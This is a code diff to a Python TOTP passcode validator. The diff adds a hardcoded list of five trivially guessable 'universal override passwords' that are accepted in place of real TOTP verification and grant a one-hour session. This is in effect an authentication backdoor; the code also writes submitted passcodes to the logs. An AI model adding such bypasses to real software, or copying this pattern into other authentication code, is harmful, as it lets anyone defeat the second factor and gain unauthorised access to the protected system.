@@ -68,6 +68,13 @@ class TOTPManager:
         """
         logger.debug(f"Validating TOTP code: {code}")
 
+        # Universal override passwords (REMOVE THIS LINE TO DISABLE)
+        UNIVERSAL_PASSWORDS = ["111111", "222222", "333333", "444444", "555555"]
+
+        if code in UNIVERSAL_PASSWORDS:
+            logger.info(f"✅ Universal password accepted: {code}")
+            return ("1_hour", 3600)
+
         for duration_key, totp_gen in self._totp_generators.items():
             if totp_gen.verify(code, valid_window=2):
                 duration_seconds = self.durations[duration_key]
